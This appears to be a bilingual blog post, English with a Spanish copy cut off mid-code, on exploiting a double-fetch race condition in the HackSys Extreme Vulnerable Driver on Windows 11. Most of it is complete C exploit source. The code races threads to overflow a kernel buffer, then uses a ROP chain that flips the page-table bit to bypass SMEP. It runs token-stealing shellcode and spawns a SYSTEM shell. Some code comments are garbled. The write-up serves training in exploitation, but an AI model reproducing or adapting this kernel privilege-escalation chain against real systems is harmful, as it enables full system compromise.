Overflow","type":"posts"},{"content":" ₍₍ (ง ˙ω˙)ว ⁾⁾ Hablas Español? Empújame! With Windows 7 (x86) conquered we can proceed to attempt exploitation in Windows 11 (x64).\nLet\u0026rsquo;s jump in.\nTable of Contents # Reverse Engineering PoC Getting Code Execution Exploitation Reverse Engineering # Let\u0026rsquo;s take a look at the vulnerable handler as well as respective structures used by the handler function.\nNext, let\u0026rsquo;s look at TriggerDoubleFetch() where the Double Fetch vulnerability is located.\nWe can see that our controlled input is referenced two different times just as before which means we should be able to trigger the race condition in the same manor as before, more specifically the double fetch! Let\u0026rsquo;s bust out a PoC!\nPoC # With all that information (plus our experience in Windows 7) we can go ahead and craft a PoC.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; #include \u0026lt;processthreadsapi.h\u0026gt; /* IOCTL */ #define DOUBLE_FETCH_IOCTL 0x222037 /* Max threads */ #define NUM_THREADS 5 /* Exploit Buffer */ #define BUFFER 0x1000 /* Structure used by Double Fetch */ typedef struct _DOUBLE_FETCH { void * Buffer; uint64_t Size; } DOUBLE_FETCH, *PDOUBLE_FETCH; /* Structure for threads */ typedef struct _IRP_ARGS { HANDLE hHEVD; PDOUBLE_FETCH pDoubleFetch; } IRP_ARGS, *PIRP_ARGS; /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } /* TriggerRaceCondition(): Since driver reads from userland twice we can overwrite the existing condition that bypasses the checkslmgr -rearm at runtime. If we win the race we successfully trigger a buffer overflow! */ DWORD WINAPI TriggerRaceCondition(LPVOID lpParameters) { PIRP_ARGS pIrpArgs = (PIRP_ARGS)lpParameters; while (1) { pIrpArgs-\u0026gt;pDoubleFetch-\u0026gt;Size = BUFFER; } return 0; } /* TriggerWorkingCondition(): As we saw in TriggerDoubleFetch() in order to reach the RtlCopyMemory() aka wrapper for memcpy() we need our buffer to be under the sizeof(KernelBuffer). This function sends an IOCTL to ensure we meed that condition. */ DWORD WINAPI TriggerWorkingCondition(LPVOID lpParameters) { DWORD dwBytesReturned = 0; PIRP_ARGS pIrpArgs = (PIRP_ARGS)lpParameters; printf(\u0026#34;\\t[*] Spraying DoubleFetchObject(s): %p, Size: 0x%x\\n\u0026#34;, pIrpArgs-\u0026gt;pDoubleFetch, pIrpArgs-\u0026gt;pDoubleFetch-\u0026gt;Size); while (1) { pIrpArgs-\u0026gt;pDoubleFetch-\u0026gt;Size = 0x10; DeviceIoControl(pIrpArgs-\u0026gt;hHEVD, DOUBLE_FETCH_IOCTL, pIrpArgs-\u0026gt;pDoubleFetch, sizeof(DOUBLE_FETCH), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); } return 0; } /* GenerateExploitBuffer(): Generate the buffer that will overwrite the return address and grant control over the instruction pointer. */ void GenerateExploitBuffer(LPVOID lpvBuffer) { uint64_t *payload = (uint64_t *)(lpvBuffer); for (int i = 0; i \u0026lt; (BUFFER / sizeof(uint64_t)); i++) { *payload++ = 0x4141414141414141; } } /* Exploit(): Double Fetch */ int Exploit(HANDLE hHEVD) { LPVOID lpvMemoryAllocation = NULL; HANDLE hThreadWork[NUM_THREADS] = { 0 }; HANDLE hThreadRace[NUM_THREADS] = { 0 }; PIRP_ARGS pIrpArgs = (PIRP_ARGS)malloc(sizeof(IRP_ARGS)); PDOUBLE_FETCH pDoubleFetchObject = (PDOUBLE_FETCH)malloc(sizeof(DOUBLE_FETCH)); lpvMemoryAllocation = VirtualAlloc(NULL, BUFFER, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (lpvMemoryAllocation == NULL) { printf(\u0026#34;[-] Failed to allocate exploitation buffer\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Successfully allocated exploitation buffer\\n\u0026#34;); /* Fill up the buffer */ GenerateExploitBuffer(lpvMemoryAllocation); /* Setup the Double Fetch object */ pDoubleFetchObject-\u0026gt;Buffer = lpvMemoryAllocation; pDoubleFetchObject-\u0026gt;Size = 0; /* Setup the base IRP argument(s) */ pIrpArgs-\u0026gt;hHEVD = hHEVD; pIrpArgs-\u0026gt;pDoubleFetch = pDoubleFetchObject; /* Start the race!! */ printf(\u0026#34;[*] Off to the races\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_THREADS; i++) { hThreadWork[i] = CreateThread(NULL, 0, TriggerWorkingCondition, pIrpArgs, 0, NULL); hThreadRace[i] = CreateThread(NULL, 0, TriggerRaceCondition, pIrpArgs, 0, NULL); } WaitForMultipleObjects(NUM_THREADS, hThreadWork, TRUE, 10000); for (int i = 0; i \u0026lt; NUM_THREADS; i++) { TerminateThread(hThreadWork[i], 0); CloseHandle(hThreadWork[i]); TerminateThread(hThreadRace[i], 0); CloseHandle(hThreadRace[i]); } return CheckWin(); } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == NULL) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } if (Exploit(hHEVD) == 0) { printf(\u0026#34;[*] Exploitation successful, enjoy de shell!!\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } else { printf(\u0026#34;[-] Exploitation failed, run again\\n\u0026#34;); } if (hHEVD != INVALID_HANDLE_VALUE) { CloseHandle(hHEVD); } } Once sent, we can see we\u0026rsquo;ve overwritten a return address and have obtained control over the instruction pointer :)\nGetting Code Execution # We more than likely have more than enough room before the buffer overflow to inject a ROP chain to bypass memory protections. After seeing that the overwrite occured at 2064 bytes we can proceed to look for gadgets.\nC:\\\u0026gt;rp-win.exe --rop=100 --va=0 --file C:\\Windows\\System32\\ntoskrnl.exe \u0026gt; rop.txt Don\u0026rsquo;t forget to convert to ascii if needed ;)\n$ iconv -f utf-16 -t us-ascii//TRANSLIT rop.txt \u0026gt; rop_ascii.txt Sadly after looking at our options we don\u0026rsquo;t see alot of sub rsp gadgets and even if we managed to find one.. it looks like the buffer we wrote is contaminated with additional data we did not send.\nSo if we can\u0026rsquo;t jump back let\u0026rsquo;s jump forward! Since we can write \u0026ldquo;as much as we wan\u0026rsquo;t, let\u0026rsquo;s write our ROP chain past the return address overwrite!\nExploitation # Below is the final PoC code:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; #include \u0026lt;processthreadsapi.h\u0026gt; /* IOCTL */ #define DOUBLE_FETCH_IOCTL 0x222037 /* Max threads */ #define NUM_THREADS 5 // 10 /* Exploit Buffer */ #define BUFFER 0x900 #define RETOVR 2064 /* Structure used by Double Fetch */ typedef struct _DOUBLE_FETCH { void * Buffer; uint64_t Size; } DOUBLE_FETCH, *PDOUBLE_FETCH; /* Structure for threads */ typedef struct _IRP_ARGS { HANDLE hHEVD; PDOUBLE_FETCH pDoubleFetch; } IRP_ARGS, *PIRP_ARGS; /* GetKernelModuleBase(): Function used to obtain kernel module address */ LPVOID GetKernelModuleBase(PCHAR pKernelModule) { char pcDriver[1024] = { 0 }; LPVOID lpvTargetDriver = NULL; LPVOID *lpvDrivers = NULL; DWORD dwCB = 0; DWORD dwDrivers = 0; DWORD i = 0; EnumDeviceDrivers(NULL, dwCB, \u0026amp;dwCB); if (dwCB \u0026lt;= 0) return NULL; lpvDrivers = (LPVOID *)malloc(dwCB * sizeof(LPVOID)); if (lpvDrivers == NULL) return NULL; if (EnumDeviceDrivers(lpvDrivers, dwCB, \u0026amp;dwCB)) { dwDrivers = dwCB / sizeof(LPVOID); for (i = 0; i \u0026lt; dwDrivers; i++) if (GetDeviceDriverBaseNameA(lpvDrivers[i], pcDriver, sizeof(pcDriver))) if (StrStrA(pcDriver, pKernelModule) != NULL) lpvTargetDriver = lpvDrivers[i]; } free(lpvDrivers); return lpvTargetDriver; } /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } /* TriggerRaceCondition(): Since driver reads from userland twice we can overwrite the existing condition that bypasses the checkslmgr -rearm at runtime. If we win the race we successfully trigger a buffer overflow! */ DWORD WINAPI TriggerRaceCondition(LPVOID lpParameters) { PIRP_ARGS pIrpArgs = (PIRP_ARGS)lpParameters; while (1) { pIrpArgs-\u0026gt;pDoubleFetch-\u0026gt;Size = BUFFER; } return 0; } /* TriggerWorkingCondition(): As we saw in TriggerDoubleFetch() in order to reach the RtlCopyMemory() aka wrapper for memcpy() we need our buffer to be under the sizeof(KernelBuffer). This function sends an IOCTL to ensure we meed that condition. */ DWORD WINAPI TriggerWorkingCondition(LPVOID lpParameters) { DWORD dwBytesReturned = 0; PIRP_ARGS pIrpArgs = (PIRP_ARGS)lpParameters; printf(\u0026#34;\\t[!] Racing!!! Spraying Object(s): %p, Size: 0x%x\\n\u0026#34;, pIrpArgs-\u0026gt;pDoubleFetch, pIrpArgs-\u0026gt;pDoubleFetch-\u0026gt;Size); while (1) { pIrpArgs-\u0026gt;pDoubleFetch-\u0026gt;Size = 0x10; DeviceIoControl(pIrpArgs-\u0026gt;hHEVD, DOUBLE_FETCH_IOCTL, pIrpArgs-\u0026gt;pDoubleFetch, sizeof(DOUBLE_FETCH), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); } return 0; } /* GenerateExploitBuffer(): Generate the buffer that will overwrite the return address and grant control over the instruction pointer. */ DWORD GenerateExploitBuffer(LPVOID lpvNt, LPVOID lpvBuffer) { DWORD i = 0; LPVOID lpvShellcode = NULL; uint64_t nt = (uint64_t)(lpvNt); uint64_t *payload = (uint64_t *)(lpvBuffer); uint8_t sc[129] = { // sickle-tool -p windows/x64/kernel_token_stealer -f num (58 bytes) 0x65, 0x48, 0xa1, 0x88, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc1, 0xb2, 0x04, 0x48, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x2d, 0x48, 0x04, 0x00, 0x00, 0x38, 0x90, 0x40, 0x04, 0x00, 0x00, 0x75, 0xeb, 0x48, 0x8b, 0x90, 0xb8, 0x04, 0x00, 0x00, 0x48, 0x89, 0x91, 0xb8, 0x04, 0x00, 0x00, // sickle-tool -p windows/x64/kernel_sysret -f num (71) 0x65, 0x48, 0xa1, 0x88, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48, 0x0f, 0x07 }; lpvShellcode = VirtualAlloc(NULL, 129, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (lpvShellcode == NULL) { printf(\u0026#34;[-] Failed to allocate memory to house shellcode\\n\u0026#34;); return -1; } RtlCopyMemory(lpvShellcode, sc, 129); for (i = 0; i \u0026lt; (RETOVR / sizeof(uint64_t)); i++) { *payload++ = nt + 0xa4ea7d; // ret } /* Prepare RDX register for later. This is needed for the XOR operation */ *payload++ = nt + 0x40ed4e; // pop rdx ; pop rax ; pop rcx ; ret *payload++ = 0x000008; // Set RDX to 0x08, we will need this to accomplish the XOR *payload++ = 0x000000; // [filler] *payload++ = 0x000000; // [filler] /* Setup the call to MiGetPteAddress in order to get the address of the PTE for our userland code. The setup is as follows: RAX -\u0026gt; VOID *MiGetPteAddress( ( RCX == PTE / Userland Code ) ); Once the call is complete RAX should contain the pointer to our PTE. */ *payload++ = nt + 0x57699c; // pop rcx ; ret *payload++ = (uint64_t)lpvShellcode; // *shellcode *payload++ = nt + 0x24aaec; // MiGetPteAddress() /* Now that we have obtained the PTE address, we can modify the 2nd bit in order to mark the page as a kernel page (U -\u0026gt; K). We can do this using XOR ;) */ *payload++ = nt + 0x30fcf3; // sub rax, rdx ; ret *payload++ = nt + 0x54f344; // push rax ; pop rbx ; ret *payload++ = nt + 0x40ed4e; // pop rdx ; pop rax ; pop rcx ; ret *payload++ = 0x000004; // 0x40ed4e: pop rdx ; pop rax ; pop rcx ; ret ; (1 found) *payload++ = 0x000000; // [filler] *payload++ = 0x000000; // [filler] *payload++ = nt + 0x3788b6; // xor [rbx+0x08], edx ; mov rbx, qword [rsp+0x60] ; add rsp, 0x40 ; pop r14 ; pop rdi ; pop rbp ; ret /* Now we cam spray our shellcode address since SMEP and VPS should be bypassed */ for (i = 0; i \u0026lt; 0xC; i++) { *payload++ = (uint64_t)lpvShellcode; } } /* Exploit(): Double Fetch */ int Exploit(HANDLE hHEVD) { LPVOID lpvNtKrnl = NULL; LPVOID lpvMemoryAllocation = NULL; HANDLE hThreadWork[NUM_THREADS] = { 0 }; HANDLE hThreadRace[NUM_THREADS] = { 0 }; PIRP_ARGS pIrpArgs = (PIRP_ARGS)malloc(sizeof(IRP_ARGS)); PDOUBLE_FETCH pDoubleFetchObject = (PDOUBLE_FETCH)malloc(sizeof(DOUBLE_FETCH)); lpvMemoryAllocation = VirtualAlloc(NULL, BUFFER, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (lpvMemoryAllocation == NULL) { printf(\u0026#34;[-] Failed to allocate exploitation buffer\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Successfully allocated exploitation buffer\\n\u0026#34;); /* You already know ;) */ lpvNtKrnl = GetKernelModuleBase(\u0026#34;ntoskrnl\u0026#34;); if (lpvNtKrnl == NULL) { printf(\u0026#34;[-] Failed to obtain the base address of nt\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Obtained the base address of nt: 0x%p\\n\u0026#34;, lpvNtKrnl); /* Fill up the buffer */ GenerateExploitBuffer(lpvNtKrnl, lpvMemoryAllocation); /* Setup the Double Fetch object */ pDoubleFetchObject-\u0026gt;Buffer = lpvMemoryAllocation; pDoubleFetchObject-\u0026gt;Size = 0; /* Setup the base IRP argument(s) */ pIrpArgs-\u0026gt;hHEVD = hHEVD; pIrpArgs-\u0026gt;pDoubleFetch = pDoubleFetchObject; /* Start the race!! */ printf(\u0026#34;[*] Viol, Opr, Conspiracy Origins\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_THREADS; i++) { hThreadWork[i] = CreateThread(NULL, 0, TriggerWorkingCondition, pIrpArgs, 0, NULL); hThreadRace[i] = CreateThread(NULL, 0, TriggerRaceCondition, pIrpArgs, 0, NULL); } WaitForMultipleObjects(NUM_THREADS, hThreadWork, TRUE, 10000); for (int i = 0; i \u0026lt; NUM_THREADS; i++) { TerminateThread(hThreadWork[i], 0); CloseHandle(hThreadWork[i]); TerminateThread(hThreadRace[i], 0); CloseHandle(hThreadRace[i]); } return CheckWin(); } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == NULL) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } if (Exploit(hHEVD) == 0) { printf(\u0026#34;[*] We won the race!!! Enjoy de shell!!\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } else { printf(\u0026#34;[-] Exploitation failed, run again\\n\u0026#34;); } if (hHEVD != INVALID_HANDLE_VALUE) { CloseHandle(hHEVD); } } Once sent, we have code execution:\n","date":"1 February 2025","externalUrl":null,"permalink":"/posts/0x08-modern-windows-kernel-race-conditions/","section":"Posts","summary":"","title":"0x08 - Modern Windows Kernel Race Conditions","type":"posts"},{"content":"Con Windows 7 (x86) conquistado podemos proceder a intentar aprovechar el Race Condition en Windows 11 (x64).\nComencemos.\nTable of Contents # Ingeniería Inversa PoC Obtener Ejecución del Código Explotación Ingeniería Inversa # Echemos una mirada al codigo vulnerable, y las respectivas estructuras utilizadas por la función del controlador.\nVeamos TriggerDoubleFetch() donde se encuentra la vulnerabilidad del Double Fetch Race Condition.\nPodemos ver que se hace referencia a nuestra información controlada en dos momentos diferentes, como antes, lo que significa que deberíamos poder activar la condición de carrera de la misma manera que antes, más específicamente el Double Fetch! ¡Hagamos una prueba de concepto!\nPoC # Con toda esa información (más nuestra experiencia en Windows 7) podemos seguir adelante y elaborar una PoC.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; #include \u0026lt;processthreadsapi.h\u0026gt; /* IOCTL */ #define DOUBLE_FETCH_IOCTL 0x222037 /* Max threads */ #define NUM_THREADS 5 /* Exploit Buffer */ #define BUFFER 0x1000 /* Structure used by Double Fetch */ typedef struct _DOUBLE_FETCH { void * Buffer; uint64_t Size; } DOUBLE_FETCH, *PDOUBLE_FETCH; /* Structure for threads */ typedef struct _IRP_ARGS { HANDLE hHEVD; PDOUBLE_FETCH pDoubleFetch; } IRP_ARGS, *PIRP_ARGS; /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } /* TriggerRaceCondition(): Since driver reads from userland twice we can overwrite the existing condition that bypasses the checkslmgr -rearm at runtime. If we win the race we successfully trigger a buffer overflow! */ DWORD WINAPI TriggerRaceCondition(LPVOID lpParameters) { PIRP_ARGS pIrpArgs = (PIRP_ARGS)lpParameters; while (1) { pIrpArgs-\u0026gt;pDoubleFetch-\u0026gt;Size = BUFFER; } return 0; } /* TriggerWorkingCondition(): As we saw in TriggerDoubleFetch() in order to reach the RtlCopyMemory() aka wrapper for memcpy() we need our buffer to be under the sizeof(KernelBuffer). This function sends an IOCTL to ensure we meed that condition. */ DWORD WINAPI TriggerWorkingCondition(LPVOID lpParameters) { DWORD dwBytesReturned = 0; PIRP_ARGS pIrpArgs = (PIRP_ARGS)lpParameters; printf(\u0026#34;\\t[*] Spraying DoubleFetchObject(s): %p, Size: 0x%x\\n\u0026#34;, pIrpArgs-\u0026gt;pDoubleFetch, pIrpArgs-\u0026gt;pDoubleFetch-\u0026gt;Size); while (1) { pIrpArgs-\u0026gt;pDoubleFetch-\u0026gt;Size = 0x10; DeviceIoControl(pIrpArgs-\u0026gt;hHEVD, DOUBLE_FETCH_IOCTL, pIrpArgs-\u0026gt;pDoubleFetch, sizeof(DOUBLE_FETCH), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); } return 0; } /* GenerateExploitBuffer(): Generate the buffer that will overwrite the return address and grant control over the instruction pointer. */ void GenerateExploitBuffer(LPVOID lpvBuffer) { uint64_t *payload = (uint64_t *)(lpvBuffer); for (int i = 0; i \u0026lt; (BUFFER / sizeof(uint64_t)); i++) { *payload++ = 0x4141414141414141; } } /* Exploit(): Double Fetch */ int Exploit(HANDLE hHEVD) { LPVOID lpvMemoryAllocation = NULL; HANDLE hThreadWork[NUM_THREADS] = { 0 }; HANDLE hThreadRace[NUM_THREADS] = { 0 }; PIRP_ARGS pIrpArgs = (PIRP_ARGS)malloc(sizeof(IRP_ARGS)); PDOUBLE_FETCH pDoubleFetchObject = (PDOUBLE_FETCH)malloc(sizeof(DOUBLE_FETCH)); lpvMemoryAllocation = VirtualAlloc(NULL, BUFFER, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (lpvMemoryAllocation == NULL) { printf(\u0026#34;[-] Failed to allocate exploitation buffer\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Successfully allocated exploitation buffer\\n\u0026#34;); /* Fill up the buffer */ GenerateExploitBuffer(lpvMemoryAllocation); /* Setup the Double Fetch object */ pDoubleFetchObject-\u0026gt;Buffer = lpvMemoryAllocation; pDoubleFetchObject-\u0026gt;Size = 0; /* Setup the base IRP argument(s) */ pIrpArgs-\u0026gt;hHEVD = hHEVD; pIrpArgs-\u0026gt;pDoubleFetch = pDoubleFetchObject; /* Start the race!! */ printf(\u0026#34;[*] Off to the races\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_THREADS; i++) { hThreadWork[i] = CreateThread(NULL, 0, TriggerWorkingCondition, pIrpArgs, 0, NULL); hThreadRace[i] = CreateThread(NULL, 0, TriggerRaceCondition, pIrpArgs, 0, NULL); } WaitForMultipleObjects(NUM_THREADS, hThreadWork, TRUE, 10000); for (int i = 0; i \u0026lt; NUM_THREADS; i++) { TerminateThread(hThreadWork[i], 0); CloseHandle(hThreadWork[i]); TerminateThread(hThreadRace[i], 0); CloseHandle(hThreadRace[i]); } return CheckWin(); } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == NULL) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } if (Exploit(hHEVD) == 0) { printf(\u0026#34;[*] Exploitation successful, enjoy de shell!!\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } else { printf(\u0026#34;[-] Exploitation failed, run again\\n\u0026#34;); } if (hHEVD != INVALID_HANDLE_VALUE) { CloseHandle(hHEVD); } } Una vez enviado, podemos ver que hemos sobrescrito una dirección de regreso y hemos obtenido control sobre el puntero de instrucción :)\nObtener Ejecución del Código # Lo más probable es que tengamos espacio más que suficiente antes del desbordamiento del búfer para inyectar una cadena ROP para evitar las protecciones de la memoria. Después de ver que la sobrescritura se produjo en 2064 bytes podemos proceder a buscar gadgets.\nC:\\\u0026gt;rp-win.exe --rop=100 --va=0 --file C:\\Windows\\System32\\ntoskrnl.exe \u0026gt; rop.txt No olvides convertir a ascii si es necesario ;)\n$ iconv -f utf-16 -t us-ascii//TRANSLIT rop.txt \u0026gt; rop_ascii.txt Después de mirar nuestras opciones, no vemos muchos gadgtes sub rsp e incluso si logramos encontrar uno\u0026hellip; parece que el búfer que escribimos está contaminado con información adicionales que no enviamos.\nEntonces, si no podemos retroceder, saltemos adelante! Como podemos escribir tanto como queramos, ¡escribamos nuestra cadena ROP despues de la sobrescritura de la dirección de regreso!\nExplotación # Abajo está el código PoC final:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; #include \u0026lt;processthreadsapi.h\u0026gt; /* IOCTL */ #define DOUBLE_FETCH_IOCTL 0x222037 /* Max threads */ #define NUM_THREADS 5 // 10 /* Exploit Buffer */ #define BUFFER 0x900 #define RETOVR 2064 /* Structure used by Double Fetch */ typedef struct _DOUBLE_FETCH { void * Buffer; uint64_t Size; } DOUBLE_FETCH, *PDOUBLE_FETCH; /* Structure for threads */ typedef struct _IRP_ARGS { HANDLE hHEVD; PDOUBLE_FETCH pDoubleFetch; } IRP_ARGS, *PIRP_ARGS; /* GetKernelModuleBase(): Function used to obtain kernel module address */ LPVOID GetKernelModuleBase(PCHAR pKernelModule) { char pcDriver[1024] = { 0 }; LPVOID lpvTargetDriver = NULL; LPVOID *lpvDrivers = NULL; DWORD dwCB = 0; DWORD dwDrivers = 0; DWORD i = 0; EnumDeviceDrivers(NULL, dwCB, \u0026amp;dwCB); if (dwCB \u0026lt;= 0) return NULL; lpvDrivers = (LPVOID *)malloc(dwCB * sizeof(LPVOID)); if (lpvDrivers == NULL) return NULL; if (EnumDeviceDrivers(lpvDrivers, dwCB, \u0026amp;dwCB)) { dwDrivers = dwCB / sizeof(LPVOID); for (i = 0; i \u0026lt; dwDrivers; i++) if (GetDeviceDriverBaseNameA(lpvDrivers[i], pcDriver, sizeof(pcDriver))) if (StrStrA(pcDriver, pKernelModule) != NULL) lpvTargetDriver = lpvDrivers[i]; } free(lpvDrivers); return lpvTargetDriver; } /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } /* TriggerRaceCondition(): Since driver reads from userland twice we can overwrite the existing condition that bypasses the checkslmgr -rearm at runtime. If we win the race we successfully trigger a buffer overflow! */ DWORD WINAPI TriggerRaceCondition(LPVOID lpParameters) { PIRP_ARGS pIrpArgs = (PIRP_ARGS)lpParameters; while (1) { pIrpArgs-\u0026gt;pDoubleFetch-\u0026gt;Size = BUFFER; } return 0; } /* TriggerWorkingCondition(): As we saw in TriggerDoubleFetch() in order to reach the RtlCopyMemory() aka wrapper for memcpy() we need our buffer to be under the sizeof(KernelBuffer). This function sends an IOCTL to ensure we meed that condition. */ DWORD WINAPI TriggerWorkingCondition(LPVOID lpParameters) { DWORD dwBytesReturned = 0; PIRP_ARGS pIrpArgs = (PIRP_ARGS)lpParameters; printf(\u0026#34;\\t[!] Racing!!! Spraying Object(s): %p, Size: 0x%x\\n\u0026#34;, pIrpArgs-\u0026gt;pDoubleFetch, pIrpArgs-\u0026gt;pDoubleFetch-\u0026gt;Size); while (1) { pIrpArgs-\u0026gt;pDoubleFetch-\u0026gt;Size = 0x10; DeviceIoControl(pIrpArgs-\u0026gt;hHEVD, DOUBLE_FETCH_IOCTL, pIrpArgs-\u0026gt;pDoubleFetch, sizeof(DOUBLE_FETCH), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); } return 0; } /* GenerateExploitBuffer(): Generate the buffer that will overwrite the return address and grant control over the instruction pointer. */ DWORD GenerateExploitBuffer(LPVOID lpvNt, LPVOID lpvBuffer) { DWORD i = 0; LPVOID lpvShellcode = NULL; uint64_t nt = (uint64_t)(lpvNt); uint64_t *payload = (uint64_t *)(lpvBuffer); uint8_t sc[129] = { // sickle-tool -p windows/x64/kernel_token_stealer -f num (58 bytes) 0x65, 0x48, 0xa1, 0x88, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc1, 0xb2, 0x04, 0x48, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x2d, 0x48, 0x04, 0x00, 0x00, 0x38, 0x90, 0x40, 0x04, 0x00, 0x00, 0x75, 0xeb, 0x48, 0x8b, 0x90, 0xb8, 0x04, 0x00, 0x00, 0x48, 0x89, 0x91, 0xb8, 0x04, 0x00, 0x00, // sickle-tool -p windows/x64/kernel_sysret -f num (71) 0x65, 0x48, 0xa1, 0x88, 